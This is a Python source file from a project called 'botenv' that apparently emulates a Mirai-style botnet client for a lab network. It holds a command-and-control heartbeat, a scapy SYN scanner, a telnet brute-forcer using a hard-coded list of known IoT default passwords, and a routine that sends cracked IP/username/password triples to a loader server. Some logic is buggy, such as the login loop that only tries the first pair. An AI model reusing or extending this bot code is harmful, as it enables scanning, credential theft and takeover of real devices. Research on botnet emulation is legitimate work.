#!/usr/bin/env python3 
# -*- coding: utf-8 -*- 
 
"""
 Software Name : botenv
 SPDX-FileCopyrightText: Copyright (c) 2021 Orange
 SPDX-License-Identifier: GPL-2.0-only

 This software is distributed under the GNU General Public License v2 only,
 the text of which is available at https://spdx.org/licenses/GPL-2.0-only.html
 or see the 'LICENCE' file for more details.

 Author: Elkin AGUAS <elkin.aguas@orange.com>
"""
 
# Here comes your imports
import time, socket, ipaddress, threading
from scapy.all import *
from telnetlib import Telnet
from botenv import rando

class bot:
	def __init__(self, name):
		self.name = name

	# Heart beat function to command & control server
	def heart_beat(self, cc_ip='127.0.0.1', hb_time=60):
		while True:
			cc = socket.socket()
			#loader = socket.socket()
			port = 2525

			print('Waiting for connection')
			try:
				cc.connect((cc_ip, port))
			except socket.error as e:
				print(str(e))

			Response = cc.recv(1024)

			heartbeat = "0x00 0x00"
			cc.send(str.encode(heartbeat))
			Response_cc = cc.recv(1024)
			print(Response_cc.decode('utf-8'))
			time.sleep(hb_time)

			cc.close()
			time.sleep(hb_time)

	# Starts thread to communicate with command & control server
	def start_bot(self, cc_ip='127.0.0.1', heart_beat=60):
		hb_thread = threading.Thread(target=self.heart_beat, args=(cc_ip, heart_beat, ))
		hb_thread.start()
		#thread_list.append(hb_thread)

	# Starts scan on the network
	def scanner_init(self, ip, ports):
		#print(ip)
		#results = {port:None for port in ports}
		results = {}
		results['ip'] = ip
		results['ports'] = []
		packet = IP(dst=ip)/TCP(dport=ports, flags='S')
		ans, unans = sr(packet, timeout=2, verbose=0)

		try:
			print(ip, flush=True)
			for req, resp in ans:
				tcp_layer = resp.getlayer(TCP)
				if tcp_layer.flags == 0x12:
					#results[tcp_layer.sport] = True
					results['ports'].append(tcp_layer.sport)
					#print("Answer from port "+str(tcp_layer.sport))
				elif tcp_layer.flags == 0x14:
					#results[tcp_layer.sport] = False
					#print("No answer from port "+str(tcp_layer.sport))
					continue
		except:
			pass

		'''
		for i in ports:
			if results[i] == True:
				print(results)
				return results
		'''

		if results['ports']:
			return results

	# Generates random IPs to be scanned
	def get_radom_ip(self):
		while True:
			o1 = rando.ip_oct(192, 192)
			o2 = rando.ip_oct(168, 168)
			o3 = rando.ip_oct(100, 100)
			o4 = rando.ip_oct(3, 8)
			ip = str(o1)+'.'+str(o2)+'.'+str(o3)+'.'+str(o4)
			return ip

			if o1 < 50 and o1 > 10: #Condition for excluding some IP addresses
				return ip
				break

	# Reports vulnerable devices to loader server
	def report_working(self, loader_ip='127.0.0.1', device='', auth_info=''):
		loader = socket.socket()
		port = 2525

		print('Waiting for connection')
		try:
			loader.connect((loader_ip, port))
		except socket.error as e:
			print(str(e))

		Response = loader.recv(1024)
		working = device['ip'] + '_' + auth_info[0] + '_' + auth_info[1]
		loader.send(str.encode(working))
		Response_loader = loader.recv(1024)
		print(Response_loader.decode('utf-8'))

		loader.close()

	# Tries to login to vulnerable devices
	def telnet_login(self, devices):
		#keys = list(devices[0])
		auth_entries = [
			["root", "vizxv"], ["root", "admin"], ["admin1\n", "admin1\n"], ["root", "888888"],
			["root", "xmhdipc"], ["root", "xmhdipc"], ["root", "xmhdipc"], ["root", "xmhdipc"], ["root", "xmhdipc"],
			["root", "xc3511"], ["root", "vizxv"], ["root", "admin"], ["admin", "admin"], ["root", "888888"],
			["root", "xmhdipc"], ["root", "xmhdipc"], ["root", "xmhdipc"], ["root", "xmhdipc"], ["root", "xmhdipc"],
			["root", "xc3511"], ["root", "vizxv"], ["root", "admin"], ["admin", "admin"], ["root", "888888"],
			["root", "xmhdipc"], ["root", "xmhdipc"], ["root", "xmhdipc"], ["root", "xmhdipc"], ["root", "xmhdipc"],
			["root", "xc3511"], ["root", "vizxv"], ["admin1", "admin1"], ["admin", "admin"], ["root", "888888"],
			["root", "xmhdipc"], ["root", "xmhdipc"], ["root", "xmhdipc"], ["root", "xmhdipc"], ["root", "xmhdipc"],
			["root", "xc3511"], ["root", "vizxv"], ["root", "admin"], ["admin", "admin"], ["root", "888888"],
			["root", "xmhdipc"], ["root", "xmhdipc"], ["root", "xmhdipc"], ["root", "xmhdipc"], ["root", "xmhdipc"],
			["root", "xc3511"], ["root", "vizxv"], ["root", "admin"], ["admin", "admin"], ["root", "888888"],
			["root", "xmhdipc"], ["root", "xmhdipc"], ["root", "xmhdipc"], ["root", "xmhdipc"], ["root", "xmhdipc"],
			["root", "xmhdipc"], ["root", "xmhdipc"], ["admin1", "admin1"]
		]

		if devices:
			for device in devices:
				for username, password in auth_entries:
					print(username+": "+password)
					tn = Telnet(device['ip'], timeout=1)
					tn.read_until(b"to17 login: ", timeout=0.1)
					tn.write((auth_entries[0][0] + '\n').encode('ascii'))
					tn.read_until(b"Password: ", timeout=0.1)
					tn.write((auth_entries[0][1] + '\n').encode('ascii'))
					a = tn.read_until(b"\r\n", timeout=0.1)
					print(str(a))
					if a == b"\r\n":
						print('login worked!')
						return device, auth_entries[0]
					else:
						print("login didn't work")
						return None, None
		else:
			#print("No devices found")
			pass


def main():
	pass

if __name__ == "__main__":
	main()
